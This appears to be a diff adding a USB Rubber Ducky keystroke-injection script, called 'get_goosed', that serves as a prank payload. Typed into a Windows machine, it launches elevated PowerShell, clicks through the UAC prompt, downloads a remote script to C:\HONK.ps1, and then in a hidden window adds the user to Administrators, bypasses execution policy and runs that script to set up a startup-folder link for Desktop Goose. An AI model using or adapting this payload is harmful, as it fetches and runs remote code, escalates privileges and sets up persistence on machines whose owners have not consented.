@@ -1,0 +1,20 @@
+REM get_goosed!
+REM Downloads a script from https://blindman51.github.io/files/get_goosed.ps1 to C:\HONK.ps1
+REM and runs it with elevated privileges. Script will download Desktop Goose and place a link 
+REM in the global startup folder.
+
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs -ArgumentList '-Command iwr -Uri https://blindman51.github.io/files/get_goosed.ps1 -OutFile C:\HONK.ps1'"
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList '-Command Add-LocalGroupMember -Group Administrators -Member $env:UserName; Set-ExecutionPolicy Bypass -Scope Process -Force; & C:\HONK.ps1'"
+ENTER
+DELAY 1000
+LEFTARROW
+ENTER
